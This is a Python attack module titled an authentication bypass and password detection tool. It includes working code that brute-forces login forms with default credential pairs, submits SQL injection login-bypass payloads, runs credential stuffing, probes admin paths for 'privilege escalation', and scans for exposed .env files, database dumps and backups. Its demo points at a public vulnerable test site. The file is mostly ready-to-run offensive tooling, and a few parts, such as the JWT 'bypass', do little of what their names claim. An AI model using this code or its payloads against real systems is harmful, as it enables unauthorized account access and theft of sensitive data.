#!/usr/bin/env python3
"""
Authentication Bypass and Password Detection Module
Provides comprehensive techniques for bypassing authentication systems
and detecting credentials to access sensitive data.
"""

import requests
import json
import time
import hashlib
import random
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

class AuthBypassManager:
    """Manages authentication bypass and password detection operations"""
    
    def __init__(self, target_url, session=None):
        self.target_url = target_url
        self.session = session or requests.Session()
        self.results = []
        self.lock = threading.Lock()
        
    def brute_force_login(self, login_url, username_list, password_list, 
                         username_field='username', password_field='password'):
        """
        Perform brute force attack on login forms
        """
        found_credentials = []
        
        def try_credentials(username, password):
            try:
                data = {
                    username_field: username,
                    password_field: password
                }
                
                response = self.session.post(login_url, data=data, timeout=10)
                
                # Check for successful login indicators
                if self._is_login_successful(response):
                    with self.lock:
                        found_credentials.append({
                            'username': username,
                            'password': password,
                            'url': login_url,
                            'method': 'brute_force'
                        })
                    return True
                    
            except Exception as e:
                pass
            return False
        
        # Try common username/password combinations
        common_combinations = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('root', 'password'),
            ('user', 'user'),
            ('test', 'test'),
            ('guest', 'guest'),
            ('admin', ''),
            ('admin', 'admin123'),
            ('admin', 'password123'),
            ('administrator', 'administrator'),
            ('root', 'toor'),
            ('admin', 'letmein'),
            ('admin', 'welcome'),
            ('admin', '123456789'),
            ('admin', 'qwerty'),
            ('admin', 'abc123'),
            ('admin', 'password1'),
            ('admin', '12345')
        ]
        
        # Try provided wordlists
        if username_list and password_list:
            for username in username_list[:50]:  # Limit to prevent overwhelming
                for password in password_list[:50]:
                    try_credentials(username, password)
                    time.sleep(0.1)  # Rate limiting
        
        # Try common combinations
        for username, password in common_combinations:
            try_credentials(username, password)
            time.sleep(0.1)
            
        return found_credentials
    
    def _is_login_successful(self, response):
        """Check if login was successful based on response indicators"""
        success_indicators = [
            'dashboard', 'welcome', 'logout', 'profile', 'settings',
            'admin', 'control panel', 'success', 'logged in'
        ]
        
        failure_indicators = [
            'invalid', 'failed', 'incorrect', 'error', 'denied',
            'authentication failed', 'login failed'
        ]
        
        content = response.text.lower()
        
        # Check for redirect after login
        if response.status_code in [301, 302, 303, 307, 308]:
            return True
            
        # Check for success indicators
        success_count = sum(1 for indicator in success_indicators 
                          if indicator in content)
        failure_count = sum(1 for indicator in failure_indicators 
                          if indicator in content)
        
        return success_count > failure_count and response.status_code == 200
    
    def sql_injection_auth_bypass(self, login_url):
        """
        Attempt SQL injection authentication bypass
        """
        sql_payloads = [
            "admin' OR '1'='1",
            "admin' OR 1=1--",
            "admin' OR 1=1#",
            "admin' OR 1=1/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "1' OR '1'='1",
            "1' OR 1=1--",
            "1' OR 1=1#",
            "1' OR 1=1/*",
            "' OR 'x'='x",
            "' OR 1=1 LIMIT 1--",
            "' UNION SELECT 1,2,3--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*"
        ]
        
        results = []
        
        for payload in sql_payloads:
            try:
                data = {
                    'username': payload,
                    'password': 'anything'
                }
                
                response = self.session.post(login_url, data=data, timeout=10)
                
                if self._is_login_successful(response):
                    results.append({
                        'payload': payload,
                        'url': login_url,
                        'method': 'sql_injection_bypass',
                        'success': True
                    })
                    
            except Exception as e:
                results.append({
                    'payload': payload,
                    'url': login_url,
                    'method': 'sql_injection_bypass',
                    'success': False,
                    'error': str(e)
                })
                
        return results
    
    def session_hijacking(self, target_url):
        """
        Attempt session hijacking through various methods
        """
        results = []
        
        # Check for predictable session IDs
        session_patterns = [
            'PHPSESSID',
            'JSESSIONID',
            'ASP.NET_SessionId',
            'sessionid',
            'token',
            'auth',
            'sid'
        ]
        
        try:
            response = self.session.get(target_url)
            
            # Analyze cookies for session management
            for cookie in self.session.cookies:
                for pattern in session_patterns:
                    if pattern.lower() in cookie.name.lower():
                        results.append({
                            'cookie_name': cookie.name,
                            'cookie_value': cookie.value,
                            'method': 'session_analysis',
                            'vulnerability': 'session_cookie_detected'
                        })
            
            # Check for session fixation vulnerabilities
            if 'Set-Cookie' in response.headers:
                set_cookie = response.headers['Set-Cookie']
                if 'HttpOnly' not in set_cookie:
                    results.append({
                        'vulnerability': 'missing_httponly_flag',
                        'cookie': set_cookie,
                        'method': 'session_security_check'
                    })
                    
                if 'Secure' not in set_cookie and target_url.startswith('https'):
                    results.append({
                        'vulnerability': 'missing_secure_flag',
                        'cookie': set_cookie,
                        'method': 'session_security_check'
                    })
                    
        except Exception as e:
            results.append({
                'error': str(e),
                'method': 'session_hijacking',
                'success': False
            })
            
        return results
    
    def privilege_escalation(self, authenticated_url):
        """
        Attempt privilege escalation from authenticated session
        """
        escalation_techniques = [
            {'path': '/admin', 'description': 'Direct admin access'},
            {'path': '/administrator', 'description': 'Administrator panel'},
            {'path': '/admin.php', 'description': 'Admin PHP file'},
            {'path': '/administrator.php', 'description': 'Administrator PHP'},
            {'path': '/admin/index.php', 'description': 'Admin index'},
            {'path': '/admin/dashboard.php', 'description': 'Admin dashboard'},
            {'path': '/admin/login.php', 'description': 'Admin login bypass'},
            {'path': '/admin/config.php', 'description': 'Admin configuration'},
            {'path': '/admin/settings.php', 'description': 'Admin settings'},
            {'path': '/admin/users.php', 'description': 'User management'},
            {'path': '/admin/backup.php', 'description': 'Backup access'},
            {'path': '/admin/export.php', 'description': 'Data export'},
            {'path': '/admin/import.php', 'description': 'Data import'},
            {'path': '/admin/upload.php', 'description': 'File upload access'},
            {'path': '/admin/files.php', 'description': 'File manager'},
            {'path': '/admin/filemanager.php', 'description': 'File manager'},
            {'path': '/admin/phpmyadmin', 'description': 'Database access'},
            {'path': '/phpmyadmin', 'description': 'Database management'},
            {'path': '/dbadmin', 'description': 'Database admin'},
            {'path': '/mysql', 'description': 'MySQL access'}
        ]
        
        results = []
        
        for technique in escalation_techniques:
            try:
                full_url = urljoin(authenticated_url, technique['path'])
                response = self.session.get(full_url, timeout=10)
                
                if response.status_code == 200:
                    results.append({
                        'url': full_url,
                        'method': 'privilege_escalation',
                        'technique': technique['description'],
                        'status': 'accessible',
                        'content_length': len(response.text)
                    })
                    
            except Exception as e:
                results.append({
                    'url': full_url,
                    'method': 'privilege_escalation',
                    'technique': technique['description'],
                    'status': 'error',
                    'error': str(e)
                })
                
        return results
    
    def credential_stuffing(self, login_url, credential_list):
        """
        Attempt credential stuffing with known breached credentials
        """
        results = []
        
        # Common breached credentials
        breached_credentials = [
            ('admin@company.com', 'password123'),
            ('user@company.com', 'welcome123'),
            ('admin', 'admin2023'),
            ('root', 'root123'),
            ('administrator', 'administrator'),
            ('test@company.com', 'test123'),
            ('support@company.com', 'support123'),
            ('info@company.com', 'info123'),
            ('contact@company.com', 'contact123'),
            ('webmaster@company.com', 'webmaster123')
        ]
        
        if credential_list:
            breached_credentials.extend(credential_list[:20])
        
        for username, password in breached_credentials:
            try:
                data = {
                    'username': username,
                    'password': password
                }
                
                response = self.session.post(login_url, data=data, timeout=10)
                
                if self._is_login_successful(response):
                    results.append({
                        'username': username,
                        'password': password,
                        'url': login_url,
                        'method': 'credential_stuffing',
                        'source': 'breached_credentials'
                    })
                    
            except Exception as e:
                pass
                
        return results
    
    def jwt_token_bypass(self, target_url):
        """
        Attempt JWT token bypass techniques
        """
        jwt_bypass_payloads = [
            {'alg': 'none', 'payload': {'user': 'admin', 'role': 'admin'}},
            {'alg': 'HS256', 'payload': {'user': 'admin', 'role': 'admin'}},
            {'alg': 'RS256', 'payload': {'user': 'admin', 'role': 'admin'}}
        ]
        
        results = []
        
        # Check for JWT tokens in headers
        try:
            response = self.session.get(target_url)
            
            # Look for Authorization headers
            auth_header = response.headers.get('Authorization', '')
            if 'Bearer' in auth_header:
                token = auth_header.split('Bearer ')[1]
                results.append({
                    'token': token[:20] + '...',
                    'method': 'jwt_detection',
                    'header': 'Authorization'
                })
                
        except Exception as e:
            pass
            
        return results
    
    def run_comprehensive_auth_bypass(self, login_url, username_list=None, 
                                    password_list=None, credential_list=None):
        """
        Run comprehensive authentication bypass testing
        """
        all_results = {
            'target': login_url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'results': []
        }
        
        # Brute force attack
        brute_results = self.brute_force_login(login_url, username_list, password_list)
        all_results['results'].extend(brute_results)
        
        # SQL injection bypass
        sql_results = self.sql_injection_auth_bypass(login_url)
        all_results['results'].extend(sql_results)
        
        # Session hijacking
        session_results = self.session_hijacking(login_url)
        all_results['results'].extend(session_results)
        
        # Credential stuffing
        stuffing_results = self.credential_stuffing(login_url, credential_list)
        all_results['results'].extend(stuffing_results)
        
        # JWT bypass (if applicable)
        jwt_results = self.jwt_token_bypass(login_url)
        all_results['results'].extend(jwt_results)
        
        return all_results


class SensitiveDataDetector:
    """Detects sensitive data and access points"""
    
    def __init__(self, base_url, session=None):
        self.base_url = base_url
        self.session = session or requests.Session()
        
    def detect_admin_panels(self):
        """Detect administrative panels and interfaces"""
        admin_paths = [
            '/admin', '/administrator', '/admin.php', '/administrator.php',
            '/admin/login.php', '/admin/index.php', '/admin/dashboard.php',
            '/admin/config.php', '/admin/settings.php', '/admin/users.php',
            '/admin/backup.php', '/admin/export.php', '/admin/import.php',
            '/admin/upload.php', '/admin/files.php', '/admin/filemanager.php',
            '/admin/phpmyadmin', '/phpmyadmin', '/dbadmin', '/mysql',
            '/cpanel', '/whm', '/webmin', '/plesk', '/directadmin',
            '/adminpanel', '/control', '/manage', '/management',
            '/admin_area', '/admin_area.php', '/admincp', '/admincp.php',
            '/moderator', '/moderator.php', '/webadmin', '/webadmin.php',
            '/siteadmin', '/siteadmin.php', '/panel', '/panel.php'
        ]
        
        results = []
        
        for path in admin_paths:
            try:
                full_url = urljoin(self.base_url, path)
                response = self.session.get(full_url, timeout=10)
                
                if response.status_code == 200:
                    # Check for admin indicators
                    content = response.text.lower()
                    admin_indicators = [
                        'admin', 'administrator', 'login', 'dashboard',
                        'control panel', 'panel', 'management', 'settings'
                    ]
                    
                    detected = any(indicator in content for indicator in admin_indicators)
                    
                    results.append({
                        'url': full_url,
                        'status': response.status_code,
                        'admin_detected': detected,
                        'content_length': len(response.text)
                    })
                    
            except Exception as e:
                results.append({
                    'url': urljoin(self.base_url, path),
                    'status': 'error',
                    'error': str(e)
                })
                
        return results
    
    def detect_backup_files(self):
        """Detect backup and configuration files"""
        backup_extensions = ['.bak', '.backup', '.old', '.orig', '.save', '.tmp', '.swp', '.swo']
        common_files = [
            'config', 'database', 'db', 'backup', 'dump', 'export', 'import',
            'settings', 'admin', 'password', 'passwd', 'users', 'accounts'
        ]
        
        results = []
        
        for filename in common_files:
            for ext in backup_extensions:
                try:
                    file_path = f"/{filename}{ext}"
                    full_url = urljoin(self.base_url, file_path)
                    response = self.session.get(full_url, timeout=10)
                    
                    if response.status_code == 200:
                        results.append({
                            'file': file_path,
                            'url': full_url,
                            'status': 'found',
                            'content_type': response.headers.get('Content-Type', 'unknown'),
                            'size': len(response.content)
                        })
                        
                except Exception as e:
                    pass
                    
        return results
    
    def detect_database_exposure(self):
        """Detect exposed database files and interfaces"""
        db_files = [
            '/database.sql', '/db.sql', '/backup.sql', '/dump.sql',
            '/database.db', '/app.db', '/data.db', '/site.db',
            '/config/database.yml', '/config/database.php',
            '/wp-config.php', '/config.php', '/settings.php',
            '/.env', '/.env.local', '/.env.production', '/.env.development',
            '/mysql.sql', '/postgres.sql', '/sqlite.db'
        ]
        
        results = []
        
        for db_file in db_files:
            try:
                full_url = urljoin(self.base_url, db_file)
                response = self.session.get(full_url, timeout=10)
                
                if response.status_code == 200:
                    # Check for database content indicators
                    content = response.text[:500]  # First 500 chars
                    db_indicators = [
                        'CREATE TABLE', 'INSERT INTO', 'DATABASE', 'mysql',
                        'postgresql', 'sqlite', 'password', 'user', 'admin'
                    ]
                    
                    is_database = any(indicator.lower() in content.lower() 
                                    for indicator in db_indicators)
                    
                    results.append({
                        'file': db_file,
                        'url': full_url,
                        'status': 'exposed',
                        'is_database': is_database,
                        'size': len(response.content)
                    })
                    
            except Exception as e:
                pass
                
        return results
    
    def detect_sensitive_directories(self):
        """Detect sensitive directories and paths"""
        sensitive_dirs = [
            '/admin', '/administrator', '/root', '/backup', '/backups',
            '/database', '/db', '/data', '/logs', '/temp', '/tmp',
            '/uploads', '/files', '/documents', '/private', '/secure',
            '/confidential', '/internal', '/restricted', '/protected',
            '/config', '/settings', '/etc', '/var', '/home', '/opt',
            '/usr', '/dev', '/proc', '/sys', '/lib', '/bin', '/sbin'
        ]
        
        results = []
        
        for directory in sensitive_dirs:
            try:
                full_url = urljoin(self.base_url, directory)
                response = self.session.get(full_url, timeout=10)
                
                if response.status_code != 404:
                    results.append({
                        'directory': directory,
                        'url': full_url,
                        'status': response.status_code,
                        'accessible': response.status_code == 200,
                        'directory_listing': 'Index of' in response.text
                    })
                    
            except Exception as e:
                results.append({
                    'directory': directory,
                    'url': full_url,
                    'status': 'error',
                    'error': str(e)
                })
                
        return results


if __name__ == "__main__":
    # Demo usage
    target = "http://testphp.vulnweb.com"
    auth_manager = AuthBypassManager(target)
    
    # Test authentication bypass
    login_url = f"{target}/login.php"
    results = auth_manager.run_comprehensive_auth_bypass(login_url)
    
    print(json.dumps(results, indent=2, ensure_ascii=False))